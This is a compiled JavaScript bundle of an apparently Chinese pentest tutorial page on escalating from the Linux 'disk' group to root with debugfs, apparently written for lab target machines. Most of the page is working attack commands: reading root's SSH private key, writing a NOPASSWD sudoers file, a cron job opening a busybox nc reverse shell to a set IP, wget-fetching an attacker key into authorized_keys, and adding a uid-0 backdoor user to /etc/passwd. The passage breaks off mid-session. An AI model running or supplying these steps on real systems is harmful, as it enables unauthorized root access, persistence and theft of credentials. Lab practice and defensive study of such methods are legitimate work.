(window.webpackJsonp=window.webpackJsonp||[]).push([[144],{507:function(s,a,t){"use strict";t.r(a);var e=t(11),n=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"作者"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#作者"}},[s._v("#")]),s._v(" 作者")]),s._v(" "),a("p",[s._v("共同创作者")]),s._v(" "),a("p",[a("a",{attrs:{href:"https://the0n3.top/",target:"_blank",rel:"noopener noreferrer"}},[s._v("111"),a("OutboundLink")],1),s._v(" "),a("a",{attrs:{href:"http://211.159.175.21/",target:"_blank",rel:"noopener noreferrer"}},[s._v("MJ"),a("OutboundLink")],1),s._v(" "),a("a",{attrs:{href:"https://www.aristore.top/",target:"_blank",rel:"noopener noreferrer"}},[s._v("Aristore"),a("OutboundLink")],1),s._v(" "),a("a",{attrs:{href:"https://space.bilibili.com/20805349",target:"_blank",rel:"noopener noreferrer"}},[s._v("ll104567"),a("OutboundLink")],1)]),s._v(" "),a("h2",{attrs:{id:"warning"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#warning"}},[s._v("#")]),s._v(" Warning")]),s._v(" "),a("p",[s._v("测试发现，使用 debugfs 写入文件并重启后，可能出现的几种情况：")]),s._v(" "),a("ul",[a("li",[s._v("正常运行")]),s._v(" "),a("li",[s._v("文件系统变为只读，shell正常")]),s._v(" "),a("li",[s._v("虚拟机崩溃，Virtualbox内存错误，再次重启，正常运行")]),s._v(" "),a("li",[s._v("虚拟机系统崩溃")])]),s._v(" "),a("p",[s._v("异常一：文件系统变为只读")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/disk-root/4.png",alt:""}})]),s._v(" "),a("p",[s._v("异常二：虚拟机崩溃（修改passwd,shadow）")]),s._v(" "),a("p",[s._v("virtualbox报内存错误。再重启一次，可以使用篡改的 root 密码登录")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/disk-root/6.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/disk-root/7.png",alt:""}})]),s._v(" "),a("p",[s._v("正常运行：")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/disk-root/10.png",alt:""}})]),s._v(" "),a("p",{staticStyle:{color:"red"}},[a("b",[s._v("文件系统变为只读的修复方案：")])]),s._v(" "),a("p",[s._v("在已经拿到root权限的情况下，执行以下命令修复文件系统：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mount")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" ro /\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("fsck")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-y")]),s._v(" /dev/sda1\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("这会恢复到上一个正确的时候，debugfs操作的文件会恢复之前的正确状态。")]),s._v(" "),a("p",[s._v("建议优先使用稳妥的读取私钥的方式提权，再尝试sudo或写入公钥的方式提权，这会立即生效，最后再考虑需要重启才能生效的提权操作（passwd,shadow...）。")]),s._v(" "),a("p",[s._v("本地靶机提权的话，打个快照随便玩了。")]),s._v(" "),a("ul",[a("li",[s._v("读取私钥：最推荐")]),s._v(" "),a("li",[s._v("sudo 提权：立即生效，推荐")]),s._v(" "),a("li",[s._v("写入公钥：立即生效，推荐")]),s._v(" "),a("li",[s._v("passwd 添加后门用户：需要重启，可能引起异常")]),s._v(" "),a("li",[s._v("shadow 添加后门用户：需要重启，可能引起异常")]),s._v(" "),a("li",[s._v("其他可能的文件写入提权：优先考虑无需重启的提权方式")])]),s._v(" "),a("h2",{attrs:{id:"读取私钥"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#读取私钥"}},[s._v("#")]),s._v(" 读取私钥")]),s._v(" "),a("p",[s._v("disk组最推荐的提权方式，读取 root 用户的 ssh 私钥文件，然后使用私钥登录，相对其他方法提权，这不会引起内核异常崩溃。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("Dodo@ezai1:~$ /usr/sbin/debugfs "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" /dev/sda1\ndebugfs "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.44")]),s._v(".5 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("15")]),s._v("-Dec-2018"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndebugfs:  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /root/.ssh/id_rsa\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("h2",{attrs:{id:"sudo"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sudo"}},[s._v("#")]),s._v(" sudo")]),s._v(" "),a("div",{staticClass:"custom-block danger"},[a("p",{staticClass:"custom-block-title"},[s._v("警告")]),s._v(" "),a("p",[s._v("注意修改 sudo 授权用户名为当前用户")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("Dodo@ezai1:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("id")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("uid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1000")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Dodo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("gid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1000")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Dodo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("groups")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1000")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Dodo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(",6"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("disk"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nDodo@ezai1:~$ "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Dodo ALL=(ALL) NOPASSWD: ALL"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /tmp/give_dodo_sudo\nDodo@ezai1:~$ /usr/sbin/debugfs "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" /dev/sda1\ndebugfs "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.44")]),s._v(".5 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("15")]),s._v("-Dec-2018"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndebugfs:  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("write")]),s._v(" /tmp/give_dodo_sudo /etc/sudoers.d/give_dodo_sudo\nAllocated inode: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("24")]),s._v("\ndebugfs:  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("4")]),s._v(">")]),s._v(" /etc/sudoers.d/give_dodo_sudo\ndebugfs:  sif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("4")]),s._v(">")]),s._v(" i_mode 0100440\ndebugfs:  sif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("4")]),s._v(">")]),s._v(" i_uid "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\ndebugfs:  sif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("4")]),s._v(">")]),s._v(" i_gid "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\ndebugfs:  q\nDodo@ezai1:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v("\nMatching Defaults entries "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" Dodo on ezai1:\n    env_reset, mail_badpass,\n    "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("secure_path")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/usr/local/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/usr/local/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/usr/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/usr/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/bin\n\nUser Dodo may run the following commands on ezai1:\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ALL"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" NOPASSWD: ALL\nDodo@ezai1:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("su")]),s._v(" -\nroot@ezai1:~"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# id")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("uid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("gid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("groups")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nroot@ezai1:~"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# ")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/disk-root/3.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"定时任务"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#定时任务"}},[s._v("#")]),s._v(" 定时任务")]),s._v(" "),a("p",{staticStyle:{color:"red"}},[a("b",[s._v("注意：定时任务部分未进行测试，谨慎使用！")])]),s._v(" "),a("p",{staticStyle:{color:"red"}},[a("b",[s._v("注意：定时任务部分未进行测试，谨慎使用！")])]),s._v(" "),a("blockquote",[a("p",[s._v("定时任务补充信息")])]),s._v(" "),a("p",[s._v("常见定时任务文件位置与格式：")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("busybox crond\tAlpine/容器精简系统\t/etc/crontabs/<user>\ncrond (Cronie)\tCentOS / RHEL 系列\t/etc/crontab + /etc/cron.d/*\ncron / Vixie cron\tDebian / Ubuntu 系列\t/etc/crontab + /etc/cron.d/*\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("文件内容格式：")]),s._v(" "),a("p",[s._v("Alpine 系统下 /etc/crontabs/"),a("user",[s._v(" 文件格式：")])],1),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("* * * * * command\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("非 Alpine 系统下 /etc/crontab 和 /etc/cron.d/* 文件格式：")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("* * * * * user command\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("对于非 Alpine 等精简系统，更推荐在 /etc/cron.d/ 目录下放置定时任务文件，文件名可以任意命名。")]),s._v(" "),a("p",[s._v("使用 "),a("code",[s._v("uname -a")]),s._v(" 查看系统信息，确定定时任务文件位置。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/disk-root/11.png",alt:""}})]),s._v(" "),a("p",[s._v("当前是 debian 10， 定时任务文件位置在 "),a("code",[s._v("/etc/crontab")]),s._v(" 和 "),a("code",[s._v("/etc/cron.d/")]),s._v(" 目录下，在 "),a("code",[s._v("/etc/cron.d/")]),s._v(" 目录下创建一个 反弹shell 的定时任务。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("ip")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.101\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("port")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4445")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"* * * * * root bash -c 'busybox nc "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ip")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$port")]),s._v(" -e /bin/bash'\"")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /tmp/test\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /tmp/test\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("使用 debugfs 写入定时任务文件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("Dodo@ezai1:~$ /usr/sbin/debugfs "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" /dev/sda1\ndebugfs "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.44")]),s._v(".5 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("15")]),s._v("-Dec-2018"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndebugfs:  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("write")]),s._v(" /tmp/test /etc/cron.d/test\nAllocated inode: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("23")]),s._v("\ndebugfs:  sif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("3")]),s._v(">")]),s._v(" i_mode 0100644\ndebugfs:  sif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("3")]),s._v(">")]),s._v(" i_uid "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\ndebugfs:  sif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("3")]),s._v(">")]),s._v(" i_gid "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\ndebugfs:  q\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("h2",{attrs:{id:"写入公钥"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写入公钥"}},[s._v("#")]),s._v(" 写入公钥")]),s._v(" "),a("p",[s._v("下载远程公钥并写入root用户的authorized_keys文件，对公钥进行权限和属主修改。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("Dodo@ezai1:~$ busybox "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" http://192.168.56.100/pentest.pub "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-O")]),s._v(" authorized_keys\nDodo@ezai1:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cp")]),s._v(" authorized_keys /tmp/root_pub\nDodo@ezai1:~$ /usr/sbin/debugfs "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" /dev/sda1\ndebugfs "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.44")]),s._v(".5 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("15")]),s._v("-Dec-2018"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndebugfs:  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("write")]),s._v(" /tmp/root_pub /root/.ssh/authorized_keys\nAllocated inode: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("23")]),s._v("\ndebugfs:  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("3")]),s._v(">")]),s._v(" /root/.ssh/authorized_keys\ndebugfs:  sif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("3")]),s._v(">")]),s._v(" i_mode 0100440\ndebugfs:  sif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("3")]),s._v(">")]),s._v(" i_uid "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\ndebugfs:  sif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("3")]),s._v(">")]),s._v(" i_gid "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\ndebugfs:  q\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("p",[s._v("攻击机")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/disk-root/2.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"passwd-添加后门用户"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#passwd-添加后门用户"}},[s._v("#")]),s._v(" passwd 添加后门用户")]),s._v(" "),a("p",[s._v("debugfs写入passwd文件，添加一个uid为0的用户。已存在的文件不能直接覆盖，先删除再写入，然后修改文件权限和属主。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("Dodo@ezai1:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cp")]),s._v(" /etc/passwd "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("passwd")]),s._v("\nDodo@ezai1:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cp")]),s._v(" /etc/passwd passwd.bak\nDodo@ezai1:~$ openssl "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("passwd")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-salt")]),s._v(" abc password\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$1")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$abc")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$BXBqpb9BZcZhXLgbee")]),s._v(".0s/\nDodo@ezai1:~$ "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'test:$1$abc$BXBqpb9BZcZhXLgbee.0s/:0:0:,,,:/root:/bin/bash'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("passwd")]),s._v("\nDodo@ezai1:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cp")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("passwd")]),s._v(" /tmp/passwd_tmp\nDodo@ezai1:~$ /usr/sbin/debugfs "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" /dev/sda1\ndebugfs "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.44")]),s._v(".5 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("15")]),s._v("-Dec-2018"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndebugfs:  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("write")]),s._v(" /tmp/passwd_tmp /etc/passwd\nwrite: Ext2 "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v(" already exists \ndebugfs:  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" /etc/passwd\ndebugfs:  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("write")]),s._v(" /tmp/passwd_tmp /etc/passwd\nAllocated inode: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("21")]),s._v("\ndebugfs:  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("1")]),s._v(">")]),s._v(" /etc/passwd\ndebugfs:  sif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("1")]),s._v(">")]),s._v(" i_mode 0100644\ndebugfs:  sif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("1")]),s._v(">")]),s._v(" i_uid "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\ndebugfs:  sif "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("1")]),s._v(">")]),s._v(" i_gid "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\ndebugfs:  